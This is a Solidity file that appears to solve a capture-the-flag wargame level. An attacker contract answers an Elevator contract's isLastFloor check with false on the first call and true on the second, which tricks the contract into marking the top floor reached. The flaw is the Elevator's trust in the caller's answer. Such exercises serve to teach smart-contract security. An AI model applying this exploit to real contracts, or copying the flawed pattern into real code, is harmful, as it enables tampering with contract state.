// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract ElevatorAttack is Building {
    uint topFloor = 10;
    bool visitedTopFloor = false;

    function goToTheTop(Elevator elevator) external {
        elevator.goTo(topFloor);
    }

    function isLastFloor(uint f) override external returns(bool) {
        if(f == topFloor && !visitedTopFloor) { 
            visitedTopFloor = true;
            return false;
        }
        else if(f == topFloor && visitedTopFloor) return true;
        else return false;
    }
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}